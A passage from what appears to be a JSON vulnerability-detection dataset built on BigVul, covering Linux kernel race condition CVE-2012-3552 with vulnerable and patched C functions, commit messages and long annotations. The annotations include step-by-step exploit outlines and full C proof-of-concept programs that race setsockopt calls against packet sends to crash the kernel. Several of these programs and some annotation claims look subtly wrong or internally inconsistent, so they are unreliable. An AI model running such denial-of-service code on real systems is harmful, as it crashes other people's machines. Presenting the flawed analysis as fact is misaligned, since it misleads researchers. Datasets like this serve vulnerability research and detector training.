param->replyopts.opt.opt.srr, where opt.opt represents the RCU-protected wrapper structure. This ensures proper synchronization and prevents use-after-free by making safe copies of ip_options when necessary.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259 \nTitle: \"inet: add RCU protection to inet->opt\"\nLink: https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe fix removed direct unsynchronized access to inet->opt and replaced it with RCU-protected access through a new ip_options_rcu wrapper structure. Instead of using atomic refcounts, the patch copies ip_options when necessary to avoid cache line dirtiness while ensuring thread-safe concurrent access.\n\nPatchType: Race condition fix via RCU synchronization and structural refactoring (addition of ip_options_rcu wrapper)\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other functions in net/ipv4/*.c that directly access inet->opt or socket options without synchronization; similar race windows may exist in IP forwarding, UDP socket setup, or other protocol handlers.\n- Audit other inet option accesses (e.g., IP_HDRINCL, IP_RETOPTS, IP_FREEBIND) for similar unsynchronized concurrent modification patterns.\n- Fuzz concurrent socket option modification combined with packet processing on affected kernel versions to identify additional timing windows.\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions in other protocol option handlers (TCP, UDP, IPv6) accessing inet structures without RCU protection could lead to comparable DoS or memory corruption issues.",
        "tests": "NA",
        "solutions": "static struct rtable *icmp_route_lookup(struct net *net, struct sk_buff *skb_in,\n\t\t\t\t\tconst struct iphdr *iph,\n\t\t\t\t\t__be32 saddr, u8 tos,\n\t\t\t\t\tint type, int code,\n \t\t\t\t\tstruct icmp_bxm *param)\n {\n \tstruct flowi4 fl4 = {\n\t\t.daddr = (param->replyopts.opt.opt.srr ?\n\t\t\t  param->replyopts.opt.opt.faddr : iph->saddr),\n \t\t.saddr = saddr,\n \t\t.flowi4_tos = RT_TOS(tos),\n \t\t.flowi4_proto = IPPROTO_ICMP,\n\t\t.fl4_icmp_type = type,\n\t\t.fl4_icmp_code = code,\n\t};\n\tstruct rtable *rt, *rt2;\n\tint err;\n\n\tsecurity_skb_classify_flow(skb_in, flowi4_to_flowi(&fl4));\n\trt = __ip_route_output_key(net, &fl4);\n\tif (IS_ERR(rt))\n\t\treturn rt;\n\n\t/* No need to clone since we're just using its address. */\n\trt2 = rt;\n\n\tif (!fl4.saddr)\n\t\tfl4.saddr = rt->rt_src;\n\n\trt = (struct rtable *) xfrm_lookup(net, &rt->dst,\n\t\t\t\t\t   flowi4_to_flowi(&fl4), NULL, 0);\n\tif (!IS_ERR(rt)) {\n\t\tif (rt != rt2)\n\t\t\treturn rt;\n\t} else if (PTR_ERR(rt) == -EPERM) {\n\t\trt = NULL;\n\t} else\n\t\treturn rt;\n\n\terr = xfrm_decode_session_reverse(skb_in, flowi4_to_flowi(&fl4), AF_INET);\n\tif (err)\n\t\tgoto relookup_failed;\n\n\tif (inet_addr_type(net, fl4.saddr) == RTN_LOCAL) {\n\t\trt2 = __ip_route_output_key(net, &fl4);\n\t\tif (IS_ERR(rt2))\n\t\t\terr = PTR_ERR(rt2);\n\t} else {\n\t\tstruct flowi4 fl4_2 = {};\n\t\tunsigned long orefdst;\n\n\t\tfl4_2.daddr = fl4.saddr;\n\t\trt2 = ip_route_output_key(net, &fl4_2);\n\t\tif (IS_ERR(rt2)) {\n\t\t\terr = PTR_ERR(rt2);\n\t\t\tgoto relookup_failed;\n\t\t}\n\t\t/* Ugh! */\n\t\torefdst = skb_in->_skb_refdst; /* save old refdst */\n\t\terr = ip_route_input(skb_in, fl4.daddr, fl4.saddr,\n\t\t\t\t     RT_TOS(tos), rt2->dst.dev);\n\n\t\tdst_release(&rt2->dst);\n\t\trt2 = skb_rtable(skb_in);\n\t\tskb_in->_skb_refdst = orefdst; /* restore old refdst */\n\t}\n\n\tif (err)\n\t\tgoto relookup_failed;\n\n\trt2 = (struct rtable *) xfrm_lookup(net, &rt2->dst,\n\t\t\t\t\t    flowi4_to_flowi(&fl4), NULL,\n\t\t\t\t\t    XFRM_LOOKUP_ICMP);\n\tif (!IS_ERR(rt2)) {\n\t\tdst_release(&rt->dst);\n\t\trt = rt2;\n\t} else if (PTR_ERR(rt2) == -EPERM) {\n\t\tif (rt)\n\t\t\tdst_release(&rt->dst);\n\t\treturn rt2;\n\t} else {\n\t\terr = PTR_ERR(rt2);\n\t\tgoto relookup_failed;\n\t}\n\treturn rt;\n\nrelookup_failed:\n\tif (rt)\n\t\treturn rt;\n\treturn ERR_PTR(err);\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/icmp.c": "void icmp_send(struct sk_buff *skb_in, int type, int code, __be32 info)\n{\n\tstruct iphdr *iph;\n\tint room;\n\tstruct icmp_bxm icmp_param;\n\tstruct rtable *rt = skb_rtable(skb_in);\n\tstruct ipcm_cookie ipc;\n\t__be32 saddr;\n\tu8  tos;\n\tstruct net *net;\n\tstruct sock *sk;\n\n\tif (!rt)\n\t\tgoto out;\n\tnet = dev_net(rt->dst.dev);\n\n\t/*\n\t *\tFind the original header. It is expected to be valid, of course.\n\t *\tCheck this, icmp_send is called from the most obscure devices\n\t *\tsometimes.\n\t */\n\tiph = ip_hdr(skb_in);\n\n\tif ((u8 *)iph < skb_in->head ||\n\t    (skb_in->network_header + sizeof(*iph)) > skb_in->tail)\n\t\tgoto out;\n\n\t/*\n\t *\tNo replies to physical multicast/broadcast\n\t */\n\tif (skb_in->pkt_type != PACKET_HOST)\n\t\tgoto out;\n\n\t/*\n\t *\tNow check at the protocol level\n\t */\n\tif (rt->rt_flags & (RTCF_BROADCAST | RTCF_MULTICAST))\n\t\tgoto out;\n\n\t/*\n\t *\tOnly reply to fragment 0. We byte re-order the constant\n\t *\tmask for efficiency.\n\t */\n\tif (iph->frag_off & htons(IP_OFFSET))\n\t\tgoto out;\n\n\t/*\n\t *\tIf we send an ICMP error to an ICMP error a mess would result..\n\t */\n\tif (icmp_pointers[type].error) {\n\t\t/*\n\t\t *\tWe are an error, check if we are replying to an\n\t\t *\tICMP error\n\t\t */\n\t\tif (iph->protocol == IPPROTO_ICMP) {\n\t\t\tu8 _inner_type, *itp;\n\n\t\t\titp = skb_header_pointer(skb_in,\n\t\t\t\t\t\t skb_network_header(skb_in) +\n\t\t\t\t\t\t (iph->ihl << 2) +\n\t\t\t\t\t\t offsetof(struct icmphdr,\n\t\t\t\t\t\t\t  type) -\n\t\t\t\t\t\t skb_in->data,\n\t\t\t\t\t\t sizeof(_inner_type),\n\t\t\t\t\t\t &_inner_type);\n\t\t\tif (itp == NULL)\n\t\t\t\tgoto out;\n\n\t\t\t/*\n\t\t\t *\tAssume any unknown ICMP type is an error. This\n\t\t\t *\tisn't specified by the RFC, but think about it..\n\t\t\t */\n\t\t\tif (*itp > NR_ICMP_TYPES ||\n\t\t\t    icmp_pointers[*itp].error)\n\t\t\t\tgoto out;\n\t\t}\n\t}\n\n\tsk = icmp_xmit_lock(net);\n\tif (sk == NULL)\n\t\treturn;\n\n\t/*\n\t *\tConstruct source address and options.\n\t */\n\n\tsaddr = iph->daddr;\n\tif (!(rt->rt_flags & RTCF_LOCAL)) {\n\t\tstruct net_device *dev = NULL;\n\n\t\trcu_read_lock();\n\t\tif (rt_is_input_route(rt) &&\n\t\t    net->ipv4.sysctl_icmp_errors_use_inbound_ifaddr)\n\t\t\tdev = dev_get_by_index_rcu(net, rt->rt_iif);\n\n\t\tif (dev)\n\t\t\tsaddr = inet_select_addr(dev, 0, RT_SCOPE_LINK);\n\t\telse\n\t\t\tsaddr = 0;\n\t\trcu_read_unlock();\n\t}\n\n\ttos = icmp_pointers[type].error ? ((iph->tos & IPTOS_TOS_MASK) |\n \t\t\t\t\t   IPTOS_PREC_INTERNETCONTROL) :\n \t\t\t\t\t  iph->tos;\n \n\tif (ip_options_echo(&icmp_param.replyopts, skb_in))\n \t\tgoto out_unlock;\n \n \n\t/*\n\t *\tPrepare data for ICMP header.\n\t */\n\n\ticmp_param.data.icmph.type\t = type;\n\ticmp_param.data.icmph.code\t = code;\n\ticmp_param.data.icmph.un.gateway = info;\n\ticmp_param.data.icmph.checksum\t = 0;\n\ticmp_param.skb\t  = skb_in;\n \ticmp_param.offset = skb_network_offset(skb_in);\n \tinet_sk(sk)->tos = tos;\n \tipc.addr = iph->saddr;\n\tipc.opt = &icmp_param.replyopts;\n \tipc.tx_flags = 0;\n \n \trt = icmp_route_lookup(net, skb_in, iph, saddr, tos,\n\t\t\t       type, code, &icmp_param);\n\tif (IS_ERR(rt))\n\t\tgoto out_unlock;\n\n\tif (!icmpv4_xrlim_allow(net, rt, type, code))\n\t\tgoto ende;\n\n\t/* RFC says return as much as we can without exceeding 576 bytes. */\n\n \troom = dst_mtu(&rt->dst);\n \tif (room > 576)\n \t\troom = 576;\n\troom -= sizeof(struct iphdr) + icmp_param.replyopts.optlen;\n \troom -= sizeof(struct icmphdr);\n \n \ticmp_param.data_len = skb_in->len - icmp_param.offset;\n\tif (icmp_param.data_len > room)\n\t\ticmp_param.data_len = room;\n\ticmp_param.head_len = sizeof(struct icmphdr);\n\n\ticmp_push_reply(&icmp_param, &ipc, &rt);\nende:\n\tip_rt_put(rt);\nout_unlock:\n\ticmp_xmit_unlock(sk);\nout:;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP socket option handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification without Proper Synchronization (Race Condition). A race condition allowing concurrent manipulation of inet->opt without RCU protection.\n\n[Mandatory] Summary:\nThe icmp_send() function in net/ipv4/icmp.c copies IP options from the incoming packet without RCU synchronization when handling ICMP error messages. When an application concurrently sets socket options via setsockopt(), another thread can free and reallocate the inet->opt structure while icmp_send() is reading or copying it, resulting in slab corruption. A remote attacker can trigger this by sending packets to an application that actively modifies socket options during network traffic processing, causing a kernel memory corruption and denial of service.\n\n[Mandatory] Root cause:\nMissing RCU synchronization when ip_options_echo() accesses and copies inet->opt, allowing concurrent modification and freeing of the shared structure by another thread.\n\n[Mandatory] Attack Surface:\nNetwork layer ICMP processing and socket option mechanisms\n\n[Mandatory] Impact Summary:\nDenial of service via kernel slab corruption and system crash\n\n[Optional] Trigger / Attack vector:\nRemote packets combined with concurrent socket option modifications (setsockopt calls)\n\n[Mandatory] Key code/struct excerpt (minimal):\nif (ip_options_echo(&icmp_param.replyopts, skb_in))\n \tgoto out_unlock;\n\nipc.addr = iph->saddr;\nipc.opt = &icmp_param.replyopts;\n \tipc.tx_flags = 0;\n\nroom -= sizeof(struct iphdr) + icmp_param.replyopts.optlen;\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nICMP message processing combined with concurrent socket option system calls (setsockopt)\n\n[Mandatory] Exploit primitive(s) available:\nUnprotected concurrent read-modify-free of kernel memory structure (inet->opt); arbitrary slab corruption\n\n[Mandatory] Exploitability summary (1 sentence):\nExploitability is moderate: requires precise timing between incoming ICMP packets and socket option modifications, but is remotely triggerable via network packets combined with local or remote thread manipulation.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n\u2022 Open a socket and repeatedly call setsockopt() to modify IP options, causing inet->opt to be reallocated\n\u2022 From a remote machine (or local second thread), send a stream of ICMP packets to the process\n\u2022 ICMP handler in kernel calls icmp_send() which attempts to copy options via ip_options_echo()\n\u2022 Race: socket option thread frees old inet->opt while icmp_send() is reading/accessing it\n\u2022 Results in use-after-free or double-free of the ip_options structure in kernel slab\n\u2022 Kernel detects corruption and panics or exhibits undefined behavior, denying service\n\n[Mandatory] Exploitation Example script payload code:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/ip.h>\n#include <netinet/ip_icmp.h>\n#include <arpa/inet.h>\n#include <pthread.h>\n\nvoid *setsockopt_thread(void *arg) {\n    int sock = *(int *)arg;\n    unsigned char optbuf[40];\n    for (int i = 0; i < 1000; i++) {\n        memset(optbuf, 0x41 + (i % 26), sizeof(optbuf));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optbuf, \n                   10 + (i % 30));\n        usleep(100);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    pthread_t thr;\n    pthread_create(&thr, NULL, setsockopt_thread, &sock);\n    \n    for (int i = 0; i < 1000; i++) {\n        char pkt[64];\n        struct icmphdr *icmp = (struct icmphdr *)pkt;\n        icmp->type = ICMP_ECHO;\n        icmp->code = 0;\n        sendto(sock, pkt, 64, 0, \n               (struct sockaddr *)&((struct sockaddr_in)\n               {.sin_family=AF_INET, .sin_addr.s_addr=inet_addr(\"127.0.0.1\")}), \n               sizeof(struct sockaddr_in));\n        usleep(50);\n    }\n    pthread_join(thr, NULL);\n    close(sock);\n    return 0;\n}\n\nFix\n\n[Mandatory] Fix code:\nif (ip_options_echo(&icmp_param.replyopts.opt.opt, skb_in))\n \tgoto out_unlock;\n\nipc.addr = iph->saddr;\nipc.opt = &icmp_param.replyopts.opt;\n \tipc.tx_flags = 0;\n\nroom -= sizeof(struct iphdr) + icmp_param.replyopts.opt.opt.optlen;\n\n[Mandatory] Fix summary:\nThe patch adds RCU protection around inet->opt by wrapping the ip_options structure in an ip_options_rcu container and changing icmp_param.replyopts access to go through the RCU-protected member (replyopts.opt.opt) instead of directly accessing replyopts. This ensures proper synchronization when concurrent threads modify socket options, preventing use-after-free and slab corruption.\n\n[Optional] Patch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259 (\"inet: add RCU protection to inet->opt\")\n\n[Optional] Patch Analysis:\nThe fix replaced direct access to inet->opt with RCU-protected access pattern. Instead of atomic refcounts and direct pointer dereference, the structure now uses RCU read-side locking and copies ip_options only when necessary, eliminating the race window where concurrent modifications could corrupt kernel memory. This is a structural refactoring that introduced ip_options_rcu wrapper to encapsulate the RCU synchronization.\n\nPatchType: Synchronization mechanism added (RCU protection wrapper introduced)\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n\u2022 Review other callers of ip_options_echo() in the kernel to identify similar unsynchronized accesses to inet->opt\n\u2022 Audit socket option handlers (setsockopt) that manipulate inet->opt to ensure atomic or RCU-protected updates throughout\n\u2022 Fuzz-test concurrent socket option modification combined with ICMP/IP packet handling to identify related race conditions in IPv4 and IPv6 stacks\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions may exist in other network paths that access inet->opt without RCU protection, potentially allowing heap corruption or DoS in IPv6 or other protocol handlers.",
        "tests": "NA",
        "solutions": "void icmp_send(struct sk_buff *skb_in, int type, int code, __be32 info)\n{\n\tstruct iphdr *iph;\n\tint room;\n\tstruct icmp_bxm icmp_param;\n\tstruct rtable *rt = skb_rtable(skb_in);\n\tstruct ipcm_cookie ipc;\n\t__be32 saddr;\n\tu8  tos;\n\tstruct net *net;\n\tstruct sock *sk;\n\n\tif (!rt)\n\t\tgoto out;\n\tnet = dev_net(rt->dst.dev);\n\n\t/*\n\t *\tFind the original header. It is expected to be valid, of course.\n\t *\tCheck this, icmp_send is called from the most obscure devices\n\t *\tsometimes.\n\t */\n\tiph = ip_hdr(skb_in);\n\n\tif ((u8 *)iph < skb_in->head ||\n\t    (skb_in->network_header + sizeof(*iph)) > skb_in->tail)\n\t\tgoto out;\n\n\t/*\n\t *\tNo replies to physical multicast/broadcast\n\t */\n\tif (skb_in->pkt_type != PACKET_HOST)\n\t\tgoto out;\n\n\t/*\n\t *\tNow check at the protocol level\n\t */\n\tif (rt->rt_flags & (RTCF_BROADCAST | RTCF_MULTICAST))\n\t\tgoto out;\n\n\t/*\n\t *\tOnly reply to fragment 0. We byte re-order the constant\n\t *\tmask for efficiency.\n\t */\n\tif (iph->frag_off & htons(IP_OFFSET))\n\t\tgoto out;\n\n\t/*\n\t *\tIf we send an ICMP error to an ICMP error a mess would result..\n\t */\n\tif (icmp_pointers[type].error) {\n\t\t/*\n\t\t *\tWe are an error, check if we are replying to an\n\t\t *\tICMP error\n\t\t */\n\t\tif (iph->protocol == IPPROTO_ICMP) {\n\t\t\tu8 _inner_type, *itp;\n\n\t\t\titp = skb_header_pointer(skb_in,\n\t\t\t\t\t\t skb_network_header(skb_in) +\n\t\t\t\t\t\t (iph->ihl << 2) +\n\t\t\t\t\t\t offsetof(struct icmphdr,\n\t\t\t\t\t\t\t  type) -\n\t\t\t\t\t\t skb_in->data,\n\t\t\t\t\t\t sizeof(_inner_type),\n\t\t\t\t\t\t &_inner_type);\n\t\t\tif (itp == NULL)\n\t\t\t\tgoto out;\n\n\t\t\t/*\n\t\t\t *\tAssume any unknown ICMP type is an error. This\n\t\t\t *\tisn't specified by the RFC, but think about it..\n\t\t\t */\n\t\t\tif (*itp > NR_ICMP_TYPES ||\n\t\t\t    icmp_pointers[*itp].error)\n\t\t\t\tgoto out;\n\t\t}\n\t}\n\n\tsk = icmp_xmit_lock(net);\n\tif (sk == NULL)\n\t\treturn;\n\n\t/*\n\t *\tConstruct source address and options.\n\t */\n\n\tsaddr = iph->daddr;\n\tif (!(rt->rt_flags & RTCF_LOCAL)) {\n\t\tstruct net_device *dev = NULL;\n\n\t\trcu_read_lock();\n\t\tif (rt_is_input_route(rt) &&\n\t\t    net->ipv4.sysctl_icmp_errors_use_inbound_ifaddr)\n\t\t\tdev = dev_get_by_index_rcu(net, rt->rt_iif);\n\n\t\tif (dev)\n\t\t\tsaddr = inet_select_addr(dev, 0, RT_SCOPE_LINK);\n\t\telse\n\t\t\tsaddr = 0;\n\t\trcu_read_unlock();\n\t}\n\n\ttos = icmp_pointers[type].error ? ((iph->tos & IPTOS_TOS_MASK) |\n \t\t\t\t\t   IPTOS_PREC_INTERNETCONTROL) :\n \t\t\t\t\t  iph->tos;\n \n\tif (ip_options_echo(&icmp_param.replyopts.opt.opt, skb_in))\n \t\tgoto out_unlock;\n \n \n\t/*\n\t *\tPrepare data for ICMP header.\n\t */\n\n\ticmp_param.data.icmph.type\t = type;\n\ticmp_param.data.icmph.code\t = code;\n\ticmp_param.data.icmph.un.gateway = info;\n\ticmp_param.data.icmph.checksum\t = 0;\n\ticmp_param.skb\t  = skb_in;\n \ticmp_param.offset = skb_network_offset(skb_in);\n \tinet_sk(sk)->tos = tos;\n \tipc.addr = iph->saddr;\n\tipc.opt = &icmp_param.replyopts.opt;\n \tipc.tx_flags = 0;\n \n \trt = icmp_route_lookup(net, skb_in, iph, saddr, tos,\n\t\t\t       type, code, &icmp_param);\n\tif (IS_ERR(rt))\n\t\tgoto out_unlock;\n\n\tif (!icmpv4_xrlim_allow(net, rt, type, code))\n\t\tgoto ende;\n\n\t/* RFC says return as much as we can without exceeding 576 bytes. */\n\n \troom = dst_mtu(&rt->dst);\n \tif (room > 576)\n \t\troom = 576;\n\troom -= sizeof(struct iphdr) + icmp_param.replyopts.opt.opt.optlen;\n \troom -= sizeof(struct icmphdr);\n \n \ticmp_param.data_len = skb_in->len - icmp_param.offset;\n\tif (icmp_param.data_len > room)\n\t\ticmp_param.data_len = room;\n\ticmp_param.head_len = sizeof(struct icmphdr);\n\n\ticmp_push_reply(&icmp_param, &ipc, &rt);\nende:\n\tip_rt_put(rt);\nout_unlock:\n\ticmp_xmit_unlock(sk);\nout:;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/inet_connection_sock.c": "struct dst_entry *inet_csk_route_req(struct sock *sk,\n\t\t\t\t     const struct request_sock *req)\n {\n \tstruct rtable *rt;\n \tconst struct inet_request_sock *ireq = inet_rsk(req);\n\tstruct ip_options *opt = inet_rsk(req)->opt;\n \tstruct net *net = sock_net(sk);\n \tstruct flowi4 fl4;\n \n \tflowi4_init_output(&fl4, sk->sk_bound_dev_if, sk->sk_mark,\n \t\t\t   RT_CONN_FLAGS(sk), RT_SCOPE_UNIVERSE,\n \t\t\t   sk->sk_protocol, inet_sk_flowi_flags(sk),\n\t\t\t   (opt && opt->srr) ? opt->faddr : ireq->rmt_addr,\n \t\t\t   ireq->loc_addr, ireq->rmt_port, inet_sk(sk)->inet_sport);\n \tsecurity_req_classify_flow(req, flowi4_to_flowi(&fl4));\n \trt = ip_route_output_flow(net, &fl4, sk);\n \tif (IS_ERR(rt))\n \t\tgoto no_route;\n\tif (opt && opt->is_strictroute && rt->rt_dst != rt->rt_gateway)\n \t\tgoto route_err;\n \treturn &rt->dst;\n \nroute_err:\n\tip_rt_put(rt);\nno_route:\n\tIP_INC_STATS_BH(net, IPSTATS_MIB_OUTNOROUTES);\n\treturn NULL;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in Linux kernel IP implementation \u2014 slab corruption via concurrent socket option manipulation\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before version 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource Without Synchronization.\nRace condition in the IP implementation allowing denial of service through slab corruption and system crash.\n\n[Mandatory] Summary:\nThe `inet_csk_route_req()` function in `net/ipv4/inet_connection_sock.c` accesses the `inet->opt` field without proper synchronization. When an application sets socket options during network traffic handling, another thread can concurrently modify the `inet->opt` pointer and free the old structure, causing the original thread to operate on freed memory. This results in slab corruption and kernel panic.\n\n[Mandatory] Root cause:\nThe code directly dereferences `inet->opt` (a pointer to `struct ip_options`) without RCU protection or locking, allowing concurrent modification and freeing of the structure by another thread.\n\n[Mandatory] Attack Surface:\nNetwork socket handling in the kernel \u2014 IPv4 connection socket management during packet processing and socket option configuration.\n\n[Mandatory] Impact Summary:\nDenial of service (kernel crash via slab corruption)\n\n[Optional] Trigger / Attack vector:\nRemote attacker sends network packets to an application while the application concurrently modifies socket options (e.g., via `setsockopt()`), triggering the race condition.\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nstruct dst_entry *inet_csk_route_req(struct sock *sk,\n                                     const struct request_sock *req)\n{\n    struct rtable *rt;\n    const struct inet_request_sock *ireq = inet_rsk(req);\n    struct ip_options *opt = inet_rsk(req)->opt;\n    struct net *net = sock_net(sk);\n    struct flowi4 fl4;\n    \n    flowi4_init_output(&fl4, sk->sk_bound_dev_if, sk->sk_mark,\n                       RT_CONN_FLAGS(sk), RT_SCOPE_UNIVERSE,\n                       sk->sk_protocol, inet_sk_flowi_flags(sk),\n                       (opt && opt->srr) ? opt->faddr : ireq->rmt_addr,\n                       ireq->loc_addr, ireq->rmt_port, inet_sk(sk)->inet_sport);\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nNetwork socket API combined with concurrent socket option modification. Attacker sends packets to trigger IP route lookup in `inet_csk_route_req()` while target application calls `setsockopt()` to modify IP options.\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free read/write on kernel heap (slab); uncontrolled dereference through the freed `ip_options` structure.\n\n[Mandatory] Exploitability summary (1 sentence):\nThe exploit reliably triggers a kernel crash by racing network packet handling against socket option modification, but achieving arbitrary code execution requires additional kernel memory disclosure and heap layout control.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a raw or connected socket and initiate incoming network traffic (e.g., via SYN packets)\n- Spawn a thread to concurrently call `setsockopt()` with IP options (e.g., `IP_OPTIONS`, `IP_RETOPTS`) to trigger modification and freeing of `inet->opt`\n- Time the concurrent access so that `inet_csk_route_req()` reads the `opt` pointer and dereferences it after another thread has freed the pointed-to structure\n- Access to freed `ip_options` structure fields (`srr`, `faddr`, `is_strictroute`, `rt_dst`, `rt_gateway`) causes slab corruption or immediate panic\n- Repeat or vary timing parameters to trigger DoS reliably\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nvoid *thread_modify_opts(void *arg) {\n    int sock = *(int *)arg;\n    unsigned char opts[4] = {68, 12, 3, 0};  /* IP_SSRR with length 12 */\n    \n    for (int i = 0; i < 10000; i++) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n        setsockopt(sock, IPPROTO_IP, IP_RETOPTS, NULL, 0);  /* Free opts */\n        usleep(10);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    if (sock < 0) perror(\"socket\");\n    \n    struct sockaddr_in addr = {0};\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8888);\n    inet_aton(\"127.0.0.1\", &addr.sin_addr);\n    \n    bind(sock, (struct sockaddr *)&addr, sizeof(addr));\n    listen(sock, 1);\n    \n    pthread_t tid;\n    pthread_create(&tid, NULL, thread_modify_opts, &sock);\n    \n    /* Send SYN packets via raw socket to trigger inet_csk_route_req() */\n    for (int i = 0; i < 1000; i++) {\n        struct sockaddr_in src = {0};\n        src.sin_family = AF_INET;\n        src.sin_port = htons(12345 + i);\n        inet_aton(\"192.168.1.2\", &src.sin_addr);\n        \n        connect(sock, (struct sockaddr *)&src, sizeof(src));\n        sleep(1);\n    }\n    \n    pthread_join(tid, NULL);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nstruct dst_entry *inet_csk_route_req(struct sock *sk,\n                                     const struct request_sock *req)\n{\n    struct rtable *rt;\n    const struct inet_request_sock *ireq = inet_rsk(req);\n    struct ip_options_rcu *opt = inet_rsk(req)->opt;\n    struct net *net = sock_net(sk);\n    struct flowi4 fl4;\n    \n    flowi4_init_output(&fl4, sk->sk_bound_dev_if, sk->sk_mark,\n                       RT_CONN_FLAGS(sk), RT_SCOPE_UNIVERSE,\n                       sk->sk_protocol, inet_sk_flowi_flags(sk),\n                       (opt && opt->opt.srr) ? opt->opt.faddr : ireq->rmt_addr,\n                       ireq->loc_addr, ireq->rmt_port, inet_sk(sk)->inet_sport);\n    security_req_classify_flow(req, flowi4_to_flowi(&fl4));\n    rt = ip_route_output_flow(net, &fl4, sk);\n    if (IS_ERR(rt))\n        goto no_route;\n    if (opt && opt->opt.is_strictroute && rt->rt_dst != rt->rt_gateway)\n        goto route_err;\n```\n\n[Mandatory] Fix summary:\nThe patch wraps the `ip_options` structure in a new `ip_options_rcu` container and protects access via RCU synchronization. Field accesses are updated from `opt->srr` and `opt->is_strictroute` to `opt->opt.srr` and `opt->opt.is_strictroute`, ensuring safe visibility of modifications across 